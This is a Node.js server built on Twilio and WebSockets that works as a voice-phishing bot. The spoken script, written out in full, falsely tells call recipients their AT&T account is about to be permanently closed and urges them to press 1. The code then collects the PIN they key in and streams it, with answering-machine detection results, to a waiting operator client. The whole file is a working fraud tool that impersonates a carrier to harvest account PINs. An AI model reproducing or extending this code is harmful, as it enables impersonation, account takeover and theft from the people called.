const WebSocket = require('ws');
const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const app = express();
const server = require('http').createServer(app);
const expressWs = require('express-ws')(app, server);
const VoiceResponse = require('twilio').twiml.VoiceResponse;
const clients = new Map();
const callIds = new Map();

function generateClientId() {
    return Math.random().toString(36).substr(2, 9);
}

function sleep( ms = 1000 ){
    return new Promise( R => setTimeout( R, ms ) );
};

// Manejo de conexiones de clientes
app.ws('/', (ws, req) => {
    let clientId;

    ws.on("message", function incoming(message) {
        const msg = JSON.parse(message);

        if (msg.action === "initiate_call" && !clientId) {
            clientId = generateClientId();
            clients.set(clientId, ws);
            callIds.set(clientId, msg.call_id);
            console.log("Client Connection Initiated", clientId, msg.call_id);
        }

        if (!clientId || !callIds.get(clientId)) {
            console.log("Client not initialized. No valid call_id found.");
            return;
        }
    });

    ws.on("close", function close() {
        clients.delete(clientId);
        callIds.delete(clientId);
    });
});

function getOrCreateClientId(CallSid) {
    // Aquí, buscamos un clientId usando CallSid como valor
    let clientId;
    for (const [key, value] of callIds.entries()) {
        if (value === CallSid) {
            clientId = key;
            break;
        }
    }
  
    // Si no encontramos un clientId existente, generamos uno nuevo y almacenamos la asociación en callIds
  /*  if (!clientId) {
        clientId = generateClientId();
        callIds.set(clientId, CallSid);
    }*/
    
    return clientId;
  }

app.use(bodyParser.urlencoded({ extended: false }));
app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "index.html"));
});
app.use(bodyParser.json());

app.post("/twilio", async ( req, res ) => {
    const CallSid = req.body.CallSid;
    const Digits = req.body.Digits;
    const AnsweredBy = req.body.AnsweredBy; // Agregado para AMD

    //console.log(`CallSid`, CallSid);
    //console.log(`req.query`, req.query);
    //console.log(`req.body`, req.body);

    const twiml = new VoiceResponse();
    const clientId = getOrCreateClientId(CallSid);
    const destinationClient = clients.get(clientId);
    
    //console.log(`clientId`, clientId);
    //console.log(`destinationClient`, destinationClient);

    if (AnsweredBy) {
        // Manejo de la respuesta AMD
           console.log(`AnsweredBy`, AnsweredBy, new Date().toISOString());
        if (destinationClient && destinationClient.readyState === WebSocket.OPEN) {
            //console.log(`AnsweredBy 2`, AnsweredBy);
            destinationClient.send(JSON.stringify({ call_id: CallSid, event: "amd_result", answered_by: AnsweredBy }));
        }
    } else if (Digits) {
        
        if (destinationClient && destinationClient.readyState === WebSocket.OPEN) {
            if (Digits === "1") {
                console.log(`Se presionó uno`, Digits);
                // Envía una notificación específica para el dígito "1"
                destinationClient.send(JSON.stringify({ call_id: CallSid, event: "digit_1_received" }));
            } else if (Digits.length > 1) {
                console.log(`Se introdujo más de un dígito`, Digits);
                // Maneja la entrada de más de un dígito (como un PIN)
                twiml.say({ voice: 'Polly.Joanna' }, "One moment please.");
                await sleep(1000); // 1000 milisegundos equivalen a 1 segundo
                destinationClient.send(JSON.stringify({ call_id: CallSid, event: "pin_received", pin: Digits }));
            } else {
                console.log(`Dígito introducido no válido`, Digits);
                // Notifica que el dígito introducido no es válido y solicita presionar "1" para cancelar
                twiml.say({ voice: 'Polly.Joanna' }, "You have entered an invalid digit. Please press 1 to cancel this request.");
            }

        }

        // Si se presionó "1", espera la entrada del PIN
        if (Digits === "1") {
            twiml.pause({ length: 120 });
        } else {
            twiml.pause({ length: 10 }); // Una pausa corta para esperar la respuesta de Python
        }
    } else {
        // Solicita al usuario que presione "1"
        const gather = twiml.gather({ numDigits: 1 });
        twiml.say("Your A T and T account is scheduled for permanent closure. If you did not request this, please press 1 to cancel. Be advised that all numbers associated with your account will be lost, and you will be unable to open a new account with us once this cancellation is complete.");
    }

    res.type('text/xml');
    res.send(twiml.toString());
});



server.listen(8080, function listening() {
    console.log("Server started on http://localhost:8080");
});



